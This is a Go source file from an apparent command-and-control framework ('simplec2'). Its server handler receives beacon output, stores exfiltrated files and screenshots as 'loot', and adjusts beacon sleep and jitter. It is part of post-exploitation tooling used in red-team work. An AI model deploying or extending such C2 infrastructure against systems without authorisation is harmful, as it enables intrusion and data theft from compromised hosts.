package main

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"unicode/utf8"

	"simplec2/pkg/bridge"
	"simplec2/pkg/logger"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

func (s *server) PushBeaconOutput(ctx context.Context, in *bridge.PushBeaconOutputRequest) (*bridge.PushBeaconOutputResponse, error) {
	logger.Infof("Received PushBeaconOutput for task %s from beacon: %s", in.TaskId, in.BeaconId)

	task, err := s.Store.GetTask(in.TaskId)
	if err != nil {
		logger.Errorf("Error finding task %s: %v", in.TaskId, err)
		return nil, err
	}

	var outputMessage string
	if task.Command == "upload" {
		lootFileName := filepath.Base(task.Arguments)
		// 将文件保存到以 task_id 命名的子目录中，避免文件名冲突
		lootTaskDir := filepath.Join(s.Config.LootDir, task.TaskID)
		if err := os.MkdirAll(lootTaskDir, 0755); err != nil {
			logger.Errorf("Error creating loot directory for task %s: %v", task.TaskID, err)
			outputMessage = fmt.Sprintf("Failed to create loot directory: %v", err)
			task.Status = "failed"
			task.Output = outputMessage
			s.Store.UpdateTask(task)
			return &bridge.PushBeaconOutputResponse{}, nil
		}
		lootFilePath := filepath.Join(lootTaskDir, lootFileName)

		if err := os.WriteFile(lootFilePath, in.Output, 0644); err != nil {
			logger.Errorf("Error saving uploaded file for task %s: %v", task.TaskID, err)
			outputMessage = fmt.Sprintf("Failed to save uploaded file: %v", err)

			// Update task status to failed
			task.Status = "failed"
			task.Output = outputMessage
			if err := s.Store.UpdateTask(task); err != nil {
				logger.Errorf("Error updating task status to failed: %v", err)
			}

			// Broadcast TASK_FAILED event
			failedEvent := struct {
				Type    string      `json:"type"`
				Payload interface{} `json:"payload"`
			}{
				Type: "TASK_FAILED",
				Payload: map[string]interface{}{
					"task_id":   task.TaskID,
					"beacon_id": task.BeaconID,
					"command":   task.Command,
					"reason":    outputMessage,
				},
			}
			failedEventBytes, err := json.Marshal(failedEvent)
			if err != nil {
				logger.Errorf("Error marshalling TASK_FAILED event: %v", err)
			} else {
				s.Hub.Broadcast(failedEventBytes)
				logger.Debugf("Broadcasted TASK_FAILED event for task %s", task.TaskID)
			}

			return &bridge.PushBeaconOutputResponse{}, nil
		} else {
			logger.Infof("Saved uploaded file to %s", lootFilePath)
			// 返回相对路径 task_id/filename 供下载使用
			outputMessage = filepath.Join(task.TaskID, lootFileName)

			// Broadcast FILE_UPLOAD_COMPLETED event
			fileEvent := struct {
				Type    string      `json:"type"`
				Payload interface{} `json:"payload"`
			}{
				Type: "FILE_UPLOAD_COMPLETED",
				Payload: map[string]interface{}{
					"task_id":       task.TaskID,
					"beacon_id":     task.BeaconID,
					"filename":      outputMessage, // 使用相对路径
					"original_path": task.Arguments,
				},
			}
			fileEventBytes, err := json.Marshal(fileEvent)
			if err != nil {
				logger.Errorf("Error marshalling FILE_UPLOAD_COMPLETED event: %v", err)
			} else {
				s.Hub.Broadcast(fileEventBytes)
				logger.Debugf("Broadcasted FILE_UPLOAD_COMPLETED event for %s", lootFileName)
			}
		}
	} else if task.Command == "exit" {
		outputMessage = "Beacon received exit command."

		// Broadcast BEACON_EXITED event
		beacon, err := s.Store.GetBeacon(task.BeaconID)
		if err != nil {
			logger.Errorf("Error getting beacon %s for exit event: %v", task.BeaconID, err)
		} else {
			exitedEvent := struct {
				Type    string      `json:"type"`
				Payload interface{} `json:"payload"`
			}{
				Type:    "BEACON_EXITED",
				Payload: beacon,
			}
			exitedEventBytes, err := json.Marshal(exitedEvent)
			if err != nil {
				logger.Errorf("Error marshalling BEACON_EXITED event: %v", err)
			} else {
				s.Hub.Broadcast(exitedEventBytes)
				logger.Infof("Broadcasted BEACON_EXITED event for %s", beacon.BeaconID)
			}
		}
	} else if task.Command == "screenshot" {
		// 保存截图到 loot 目录
		screenshotFileName := "screenshot.png"
		lootTaskDir := filepath.Join(s.Config.LootDir, task.TaskID)
		if err := os.MkdirAll(lootTaskDir, 0755); err != nil {
			logger.Errorf("Error creating loot directory for screenshot task %s: %v", task.TaskID, err)
			outputMessage = fmt.Sprintf("Failed to save screenshot: %v", err)
		} else {
			lootFilePath := filepath.Join(lootTaskDir, screenshotFileName)
			if err := os.WriteFile(lootFilePath, in.Output, 0644); err != nil {
				logger.Errorf("Error saving screenshot for task %s: %v", task.TaskID, err)
				outputMessage = fmt.Sprintf("Failed to save screenshot: %v", err)
			} else {
				logger.Infof("Saved screenshot to %s", lootFilePath)
				// 返回相对路径供 WebUI 获取
				outputMessage = filepath.Join(task.TaskID, screenshotFileName)
			}
		}
	} else if task.Command == "download" {
		// For download command, get the completion message
		if utf8.Valid(in.Output) {
			outputMessage = string(in.Output)
		} else {
			outputMessage = strings.ToValidUTF8(string(in.Output), "\uFFFD")
		}

		// Broadcast FILE_DOWNLOAD_COMPLETED event
		var downloadResult map[string]interface{}
		if err := json.Unmarshal(in.Output, &downloadResult); err == nil {
			completedEvent := struct {
				Type    string      `json:"type"`
				Payload interface{} `json:"payload"`
			}{
				Type: "FILE_DOWNLOAD_COMPLETED",
				Payload: map[string]interface{}{
					"task_id":     task.TaskID,
					"beacon_id":   task.BeaconID,
					"destination": downloadResult["destination"],
					"file_size":   downloadResult["file_size"],
					"success":     downloadResult["success"],
				},
			}
			completedEventBytes, err := json.Marshal(completedEvent)
			if err != nil {
				logger.Errorf("Error marshalling FILE_DOWNLOAD_COMPLETED event: %v", err)
			} else {
				s.Hub.Broadcast(completedEventBytes)
				logger.Debugf("Broadcasted FILE_DOWNLOAD_COMPLETED event for %s", task.TaskID)
			}

			// Check if download was not successful
			if success, ok := downloadResult["success"].(bool); ok && !success {
				// Update task status to failed
				task.Status = "failed"
				task.Output = outputMessage
				if err := s.Store.UpdateTask(task); err != nil {
					logger.Errorf("Error updating task status to failed: %v", err)
				}

				// Broadcast TASK_FAILED event
				failedEvent := struct {
					Type    string      `json:"type"`
					Payload interface{} `json:"payload"`
				}{
					Type: "TASK_FAILED",
					Payload: map[string]interface{}{
						"task_id":   task.TaskID,
						"beacon_id": task.BeaconID,
						"command":   task.Command,
						"reason":    outputMessage,
					},
				}
				failedEventBytes, err := json.Marshal(failedEvent)
				if err != nil {
					logger.Errorf("Error marshalling TASK_FAILED event: %v", err)
				} else {
					s.Hub.Broadcast(failedEventBytes)
					logger.Debugf("Broadcasted TASK_FAILED event for task %s", task.TaskID)
				}
			}
		} else {
			// Failed to parse download result
			logger.Errorf("Failed to parse download result for task %s: %v", task.TaskID, err)
			outputMessage = fmt.Sprintf("Failed to parse download result: %v", err)

			// Update task status to failed
			task.Status = "failed"
			task.Output = outputMessage
			if err := s.Store.UpdateTask(task); err != nil {
				logger.Errorf("Error updating task status to failed: %v", err)
			}

			// Broadcast TASK_FAILED event
			failedEvent := struct {
				Type    string      `json:"type"`
				Payload interface{} `json:"payload"`
			}{
				Type: "TASK_FAILED",
				Payload: map[string]interface{}{
					"task_id":   task.TaskID,
					"beacon_id": task.BeaconID,
					"command":   task.Command,
					"reason":    outputMessage,
				},
			}
			failedEventBytes, err := json.Marshal(failedEvent)
			if err != nil {
				logger.Errorf("Error marshalling TASK_FAILED event: %v", err)
			} else {
				s.Hub.Broadcast(failedEventBytes)
				logger.Debugf("Broadcasted TASK_FAILED event for task %s", task.TaskID)
			}

			return &bridge.PushBeaconOutputResponse{}, nil
		}
	} else {
		if utf8.Valid(in.Output) {
			outputMessage = string(in.Output)
		} else {
			decoder := simplifiedchinese.GBK.NewDecoder()
			utf8Bytes, _, err := transform.Bytes(decoder, in.Output)
			if err == nil {
				outputMessage = string(utf8Bytes)
			} else {
				outputMessage = strings.ToValidUTF8(string(in.Output), "\uFFFD")
			}
		}
	}

	task.Status = "completed"
	task.Output = outputMessage
	if err := s.Store.UpdateTask(task); err != nil {
		logger.Errorf("Error updating task output: %v", err)
		return nil, err
	}

	// After updating the task, check for side effects
	if task.Command == "sleep" {
		logger.Infof("Processing side effects for sleep task %s. Arguments: '%s'", task.TaskID, task.Arguments)
		args := strings.Fields(strings.TrimSpace(task.Arguments))
		if len(args) > 0 {
			newSleep, err := strconv.Atoi(args[0])
			if err != nil {
				logger.Errorf("Failed to parse sleep argument '%s' as int: %v", args[0], err)
			} else {
				newJitter := 0
				if len(args) > 1 {
					if j, err := strconv.Atoi(args[1]); err == nil {
						newJitter = j
					} else {
						logger.Warnf("Failed to parse jitter argument '%s' as int: %v", args[1], err)
					}
				}

				beacon, err := s.Store.GetBeacon(task.BeaconID)
				if err != nil {
					logger.Errorf("Error getting beacon %s for sleep update: %v", task.BeaconID, err)
				} else {
					beacon.Sleep = newSleep
					beacon.Jitter = newJitter
					if err := s.Store.UpdateBeacon(beacon); err != nil {
						logger.Errorf("Error updating beacon %s sleep interval: %v", task.BeaconID, err)
					} else {
						logger.Infof("Successfully updated beacon %s sleep to %d (jitter: %d%%)", beacon.BeaconID, beacon.Sleep, beacon.Jitter)
						// Broadcast the beacon metadata update event
						beaconUpdateEvent := struct {
							Type    string      `json:"type"`
							Payload interface{} `json:"payload"`
						}{
							Type:    "BEACON_METADATA_UPDATED",
							Payload: beacon,
						}
						beaconEventBytes, err := json.Marshal(beaconUpdateEvent)
						if err != nil {
							logger.Errorf("Error marshalling beacon update event: %v", err)
						} else {
							s.Hub.Broadcast(beaconEventBytes)
							logger.Infof("Broadcasted BEACON_METADATA_UPDATED event for %s", beacon.BeaconID)
						}
					}
				}
			}
		}
	}

	// Broadcast the task update event via WebSocket
	event := struct {
		Type    string      `json:"type"`
		Payload interface{} `json:"payload"`
	}{
		Type:    "TASK_OUTPUT",
		Payload: task,
	}
	eventBytes, err := json.Marshal(event)
	if err != nil {
		logger.Errorf("Error marshalling task output event: %v", err)
	} else {
		s.Hub.Broadcast(eventBytes)
		logger.Infof("Broadcasted TASK_OUTPUT event for %s", task.TaskID)
	}

	return &bridge.PushBeaconOutputResponse{}, nil
}
